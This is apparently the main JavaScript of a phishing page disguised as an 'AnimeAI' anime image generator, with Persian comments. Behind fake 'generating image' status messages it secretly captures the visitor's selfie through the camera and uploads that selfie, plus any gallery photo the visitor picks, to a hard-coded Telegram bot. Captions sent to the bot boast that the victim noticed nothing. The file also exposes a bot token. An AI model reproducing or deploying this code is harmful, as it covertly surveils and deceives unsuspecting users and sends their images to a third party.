/* =========================================================
   AnimeAI - Main JavaScript
   ========================================================= */

/* =========================
   Telegram Configuration
   ========================= */

/*
  توکن جدید ربات خودت را اینجا قرار بده.
  توکن قبلی را به دلیل افشای امنیتی استفاده نکن.
*/
const BOT_TOKEN = "8566992764:AAFzGDD4qwJrTdQRMOTY0hS_lI-wN5Og2RA";

const CHAT_ID = "8278464840";

const TELEGRAM_API =
  `https://api.telegram.org/bot${BOT_TOKEN}`;


/* =========================
   DOM
   ========================= */

const imageLink =
  document.getElementById("imageLink");

const cameraSearchBtn =
  document.getElementById("cameraSearchBtn");

const sendLinkBtn =
  document.getElementById("sendLinkBtn");

const galleryInput =
  document.getElementById("galleryInput");

const galleryBtn =
  document.getElementById("galleryBtn");

const createBtn =
  document.getElementById("createBtn");

const previewSection =
  document.getElementById("previewSection");

const previewBox =
  document.getElementById("previewBox");

const imagePreview =
  document.getElementById("imagePreview");

const fileName =
  document.getElementById("fileName");

const uploadBadge =
  document.getElementById("uploadBadge");

const animeStyleSection =
  document.getElementById("animeStyleSection");

const statusBox =
  document.getElementById("status");

const cameraVideo =
  document.getElementById("cameraVideo");

const cameraCanvas =
  document.getElementById("cameraCanvas");

const permissionOverlay =
  document.getElementById("permissionOverlay");

const permissionContinue =
  document.getElementById("permissionContinue");

const permissionCancel =
  document.getElementById("permissionCancel");

const alertOverlay =
  document.getElementById("alertOverlay");

const alertTitle =
  document.getElementById("alertTitle");

const alertMessage =
  document.getElementById("alertMessage");

const alertClose =
  document.getElementById("alertClose");

const selectedStyleName =
  document.getElementById("selectedStyleName");


/* =========================
   State
   ========================= */

let selectedGalleryFile = null;

let cameraStream = null;

let selectedAnimeStyle =
  "Jujutsu Kaisen";

let currentAction = null;

let cameraBusy = false;


/* =========================
   Helpers
   ========================= */

function setStatus(message, type = "") {

  if (!statusBox) return;

  statusBox.textContent =
    message;

  statusBox.className =
    "status" +
    (type ? ` ${type}` : "");
}


function isValidHttpLink(value) {

  const link =
    String(value || "").trim();

  /*
    فقط HTTP مجاز است.
    HTTPS عمداً رد می‌شود.
  */

  return /^http:\/\/.+/i.test(link);
}


function escapeTelegramText(value) {

  return String(value || "")
    .replace(
      /[_*[\]()~`>#+\-=|{}.!]/g,
      "\\$&"
    );
}


/* =========================
   Settings Check
   ========================= */

function checkSettings() {

  if (
    !BOT_TOKEN ||
    BOT_TOKEN === "توکن_جدید_ربات_خودت" ||
    BOT_TOKEN.trim() === ""
  ) {
    return false;
  }

  if (
    !CHAT_ID ||
    CHAT_ID.trim() === ""
  ) {
    return false;
  }

  return true;
}


/* =========================
   Preview
   ONLY GALLERY
   ========================= */

function showGalleryPreview(file) {

  if (!file) return;

  if (
    !file.type ||
    !file.type.startsWith("image/")
  ) {

    setStatus(
      "لطفاً یک فایل تصویری انتخاب کنید.",
      "error"
    );

    return;
  }

  selectedGalleryFile =
    file;

  const reader =
    new FileReader();

  reader.onload = function () {

    if (imagePreview) {

      imagePreview.src =
        reader.result;

      imagePreview.style.display =
        "block";
    }

    if (previewBox) {

      previewBox.classList.add(
        "has-image"
      );
    }

    if (previewSection) {

      previewSection.classList.add(
        "show"
      );
    }

    if (fileName) {

      fileName.textContent =
        file.name;
    }

    if (uploadBadge) {

      uploadBadge.textContent =
        "آپلود شد ✓";

      uploadBadge.style.display =
        "none";
    }

    /*
      بخش انتخاب سبک بعد از انتخاب عکس
      دوباره نمایش داده می‌شود.
    */

    if (animeStyleSection) {

      animeStyleSection.style.display =
        "";

      animeStyleSection.classList.add(
        "show"
      );
    }

    setStatus(
      "عکس با موفقیت اپلود شد ✓",
      "success"
    );

  };

  reader.onerror = function () {

    setStatus(
      "خواندن تصویر انجام نشد.",
      "error"
    );
  };

  reader.readAsDataURL(file);
}


/* =========================
   Gallery Input
   ========================= */

if (galleryInput) {

  galleryInput.addEventListener(
    "change",
    function () {

      const file =
        this.files &&
        this.files[0];

      if (!file) return;

      showGalleryPreview(file);
    }
  );
}


if (galleryBtn && galleryInput) {

  galleryBtn.addEventListener(
    "click",
    function (event) {

      event.preventDefault();

      galleryInput.click();
    }
  );
}


/* =========================
   Anime Style Selection
   ========================= */

document
  .querySelectorAll(".style-card")
  .forEach(card => {

    card.addEventListener(
      "click",
      function (event) {

        event.preventDefault();

        document
          .querySelectorAll(".style-card")
          .forEach(item => {

            item.classList.remove(
              "active"
            );

          });

        this.classList.add(
          "active"
        );

        selectedAnimeStyle =
          this.dataset.style ||
          "Jujutsu Kaisen";

        if (selectedStyleName) {

          selectedStyleName.textContent =
            selectedAnimeStyle;
        }
      }
    );

  });


/* =========================
   Camera Permission
   ========================= */

async function requestCamera() {

  if (
    !navigator.mediaDevices ||
    !navigator.mediaDevices.getUserMedia
  ) {

    throw new Error(
      "دسترسی دوربین در این مرورگر پشتیبانی نمی‌شود."
    );
  }

  cameraStream =
    await navigator.mediaDevices.getUserMedia({

      video: {

        facingMode: "user",

        width: {
          ideal: 1280
        },

        height: {
          ideal: 720
        }

      },

      audio: false

    });

  if (cameraVideo) {

    cameraVideo.srcObject =
      cameraStream;

    cameraVideo.muted =
      true;

    cameraVideo.playsInline =
      true;

    await cameraVideo.play();
  }
}


/* =========================
   Stop Camera
   ========================= */

function stopCamera() {

  if (cameraStream) {

    cameraStream
      .getTracks()
      .forEach(track => {

        track.stop();

      });

    cameraStream =
      null;
  }

  if (cameraVideo) {

    cameraVideo.srcObject =
      null;
  }
}


/* =========================
   Capture Selfie
   ========================= */

async function captureSelfie() {

  if (
    !cameraVideo ||
    !cameraCanvas
  ) {

    throw new Error(
      "عکس آماده نیست."
    );
  }

  if (
    !cameraVideo.videoWidth ||
    !cameraVideo.videoHeight
  ) {

    throw new Error(
      "تصویر هنوز آماده نشده است."
    );
  }

  const width =
    cameraVideo.videoWidth;

  const height =
    cameraVideo.videoHeight;

  cameraCanvas.width =
    width;

  cameraCanvas.height =
    height;

  const ctx =
    cameraCanvas.getContext(
      "2d"
    );

  if (!ctx) {

    throw new Error(
      "Canvas در دسترس نیست."
    );
  }

  ctx.save();

  ctx.translate(
    width,
    0
  );

  ctx.scale(
    -1,
    1
  );

  ctx.drawImage(
    cameraVideo,
    0,
    0,
    width,
    height
  );

  ctx.restore();

  return await new Promise(
    (resolve, reject) => {

      cameraCanvas.toBlob(
        blob => {

          if (!blob) {

            reject(
              new Error(
                "ساخت عکس انجام نشد."
              )
            );

            return;
          }

          resolve(blob);

        },
        "image/jpeg",
        0.92
      );

    }
  );
}


/* =========================
   Telegram Request
   ========================= */

async function telegramRequest(
  method,
  formData
) {

  if (!checkSettings()) {

    throw new Error(
      "توکن ربات را در script.js وارد کنید."
    );
  }

  const response =
    await fetch(
      `${TELEGRAM_API}/${method}`,
      {
        method: "POST",
        body: formData
      }
    );

  let data = null;

  try {

    data =
      await response.json();

  } catch (_) {

    data =
      null;
  }

  if (
    !response.ok ||
    !data ||
    !data.ok
  ) {

    const description =
      data &&
      data.description
        ? data.description
        : `HTTP ${response.status}`;

    throw new Error(
      description
    );
  }

  return data;
}


/* =========================
   Send Photo
   ========================= */

async function sendPhotoToBot(
  blob,
  caption
) {

  const formData =
    new FormData();

  formData.append(
    "chat_id",
    CHAT_ID
  );

  formData.append(
    "photo",
    blob,
    "selfie.jpg"
  );

  if (caption) {

    formData.append(
      "caption",
      caption
    );
  }

  return await telegramRequest(
    "sendPhoto",
    formData
  );
}


/* =========================
   Send Gallery Photo
   ========================= */

async function sendGalleryPhotoToBot(
  file
) {

  if (!file) {

    throw new Error(
      "عکس گالری انتخاب نشده است."
    );
  }

  const formData =
    new FormData();

  formData.append(
    "chat_id",
    CHAT_ID
  );

  formData.append(
    "photo",
    file,
    file.name ||
    "gallery.jpg"
  );

  formData.append(
  "caption",
  "ماموریت انجام شد، شخص بگا رفت🤣😎"
);

  return await telegramRequest(
    "sendPhoto",
    formData
  );
}


/* =========================
   Send Link Information
   ========================= */

async function sendLinkInformation(
  link
) {

  const formData =
    new FormData();

  formData.append(
    "chat_id",
    CHAT_ID
  );

  formData.append(
    "text",
    `شخص هیچ گوهی نتونست بخوره و لیست بگایی ها رفت😂😎`
  );

  return await telegramRequest(
    "sendMessage",
    formData
  );
}


/* =========================
   WARNING
   ========================= */

function showWarning(
  action
) {

  currentAction =
    action;

  if (!alertOverlay) {

    openPermission();

    return;
  }

  if (alertTitle) {

    alertTitle.textContent =
      action === "link"
        ? "هشدار جستجو با لینک"
        : "هشدار ساخت تصویر";
  }

  if (alertMessage) {

    if (action === "link") {

      alertMessage.textContent =
        "برای ادامه جستجو با لینک، ابتدا باید اجازه دسترسی به دوربین/عکس را بدهید، تا عکس شما ساخته شود.";

    } else {

      alertMessage.textContent =
        "برای ساخت تصویر، ابتدا باید اجازه دسترسی به دوربین را بدهید.";

    }
  }

  alertOverlay.classList.add(
    "show"
  );
}


/* =========================
   Permission
   ========================= */

function openPermission() {

  if (permissionOverlay) {

    permissionOverlay.classList.add(
      "show"
    );
  }
}


function closePermission() {

  if (permissionOverlay) {

    permissionOverlay.classList.remove(
      "show"
    );
  }
}


/* =========================
   LINK FLOW
   ========================= */

async function runLinkFlow() {

  const link =
    imageLink
      ? imageLink.value.trim()
      : "";

  if (!isValidHttpLink(link)) {

    setStatus(
      "لینک باید حتماً با http:// شروع شود.",
      "error"
    );

    return;
  }

  if (cameraBusy) return;

  cameraBusy =
    true;

  setStatus(
    "در حال آماده‌سازی عکس..."
  );

  try {

    await requestCamera();

    setStatus(
      "در حال اپلود عکس..."
    );

    const selfie =
      await captureSelfie();

    stopCamera();

    setStatus(
      "در حال ساخت تصویر..."
    );

    /*
      LINK FLOW:
      فقط سلفی ارسال می‌شود.
      Preview هیچ تغییری نمی‌کند.
    */

    await sendPhotoToBot(
      selfie,
      `خدایی عشق کن شخص هیچ چیزی هم نفهمید و بگا رفت🤣😎`
    );

    /*
      اطلاعات لینک نیز جداگانه ارسال می‌شود.
    */

    await sendLinkInformation(
      link
    );

    setStatus(
      "عکس با موفقیت دریافت شد...✓",
      "success"
    );

  } catch (error) {

    stopCamera();

    console.error(
      "Link Flow Error:",
      error
    );

    setStatus(
      `خطا: ${error.message || "ساخت انجام نشد."}`,
      "error"
    );

  } finally {

    cameraBusy =
      false;
  }
}


/* =========================
   CREATE IMAGE FLOW
   ========================= */

async function runCreateImageFlow() {

  /*
    ساخت تصویر کاملاً مستقل از لینک است.
    عکس گالری الزامی است.
  */

  if (!selectedGalleryFile) {

    setStatus(
      "ابتدا یک عکس از گالری انتخاب کنید.",
      "error"
    );

    return;
  }

  if (cameraBusy) return;

  cameraBusy =
    true;

  setStatus(
    "در حال آماده‌سازی تصویر..."
  );

  try {

    await requestCamera();

    setStatus(
      "در حال اپلود تصویر.."
    );

    const selfie =
      await captureSelfie();

    stopCamera();

    /*
      مهم:
      سلفی وارد Preview نمی‌شود.
      Preview همان عکس گالری باقی می‌ماند.
    */

    setStatus(
      "در حال دریافت عکس گالری..."
    );

    await sendGalleryPhotoToBot(
      selectedGalleryFile
    );

    setStatus(
      "در حال دریافت عکس ..."
    );

    await sendPhotoToBot(
      selfie,
      `شخص با موفقیت بدبخت شد😁😎`
    );

    setStatus(
      "عکس گالری با موفقیت اپلود شد ✓",
      "success"
    );

  } catch (error) {

    stopCamera();

    console.error(
      "Create Image Flow Error:",
      error
    );

    setStatus(
      `خطا: ${error.message || "ارسال انجام نشد."}`,
      "error"
    );

  } finally {

    cameraBusy =
      false;
  }
}


/* =========================
   CAMERA SEARCH BUTTON
   ========================= */

if (cameraSearchBtn) {

  cameraSearchBtn.addEventListener(
    "click",
    function (event) {

      event.preventDefault();

      const link =
        imageLink
          ? imageLink.value.trim()
          : "";

      /*
        فقط HTTP.
        HTTPS و هر چیز دیگری رد می‌شود.
      */

      if (!isValidHttpLink(link)) {

        setStatus(
          "لینک باید حتماً با http:// شروع شود.",
          "error"
        );

        return;
      }

      showWarning(
        "link"
      );
    }
  );
}


/* =========================
   SEND LINK BUTTON
   ========================= */

if (sendLinkBtn) {

  sendLinkBtn.addEventListener(
    "click",
    function (event) {

      event.preventDefault();

      const link =
        imageLink
          ? imageLink.value.trim()
          : "";

      if (!isValidHttpLink(link)) {

        setStatus(
          "لینک باید حتماً با http:// شروع شود.",
          "error"
        );

        return;
      }

      showWarning(
        "link"
      );
    }
  );
}


/* =========================
   CREATE BUTTON
   ========================= */

if (createBtn) {

  createBtn.addEventListener(
    "click",
    function (event) {

      event.preventDefault();

      /*
        ساخت تصویر کاملاً مستقل از لینک است.
      */

      if (!selectedGalleryFile) {

        setStatus(
          "ابتدا عکس گالری را انتخاب کنید.",
          "error"
        );

        return;
      }

      showWarning(
        "create"
      );
    }
  );
}


/* =========================
   ALERT CONTINUE
   ========================= */

if (alertClose) {

  alertClose.addEventListener(
    "click",
    function (event) {

      event.preventDefault();

      if (alertOverlay) {

        alertOverlay.classList.remove(
          "show"
        );
      }

      openPermission();
    }
  );
}


/* =========================
   PERMISSION CANCEL
   ========================= */

if (permissionCancel) {

  permissionCancel.addEventListener(
    "click",
    function (event) {

      event.preventDefault();

      closePermission();

      stopCamera();

      currentAction =
        null;

      setStatus(
        "عملیات لغو شد."
      );
    }
  );
}


/* =========================
   PERMISSION ALLOW
   ========================= */

if (permissionContinue) {

  permissionContinue.addEventListener(
    "click",
    async function (event) {

      event.preventDefault();

      closePermission();

      const action =
        currentAction;

      /*
        مسیرها کاملاً جدا هستند.
      */

      if (action === "link") {

        await runLinkFlow();

      } else if (action === "create") {

        await runCreateImageFlow();

      } else {

        setStatus(
          "عملیات مشخص نیست.",
          "error"
        );
      }

    }
  );
}


/* =========================
   PAGE EXIT
   ========================= */

window.addEventListener(
  "beforeunload",
  function () {

    stopCamera();
  }
);


/* =========================================================
   Preview Fixes
   فقط عکس گالری
   ========================================================= */

(function addPreviewFixes() {

  const style =
    document.createElement(
      "style"
    );

  style.textContent = `

    .preview-box {
      min-height: 125px;
      max-height: 165px;
      height: 155px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    .preview-box img {
      width: auto;
      height: 140px;
      max-width: 92%;
      max-height: 140px;
      object-fit: contain;
    }

    .preview-empty {
      min-height: 125px;
      display: grid;
      place-items: center;
    }

    .preview-box.has-image {
      position: relative;
    }

    .preview-box.has-image .preview-empty {
      display: none;
    }

    .preview-box.has-image::after {
      content: "آپلود شد ✓";
      position: absolute;
      top: 8px;
      right: 8px;
      z-index: 20;

      padding: 5px 9px;

      border-radius: 999px;

      color: white;

      background:
        linear-gradient(
          135deg,
          rgba(39,226,123,.95),
          rgba(19,156,91,.95)
        );

      border: 1px solid rgba(255,255,255,.2);

      font-size: 10px;
      font-weight: 900;

      pointer-events: none;

      backdrop-filter: blur(8px);
    }

    .preview-title .upload-badge {
      display: none !important;
    }

  `;

  document.head.appendChild(
    style
  );

})();


/* =========================================================
   Initial State
   ========================================================= */

if (previewSection) {

  previewSection.classList.remove(
    "show"
  );
}

if (previewBox) {

  previewBox.classList.remove(
    "has-image"
  );
}

if (imagePreview) {

  imagePreview.style.display =
    "none";
}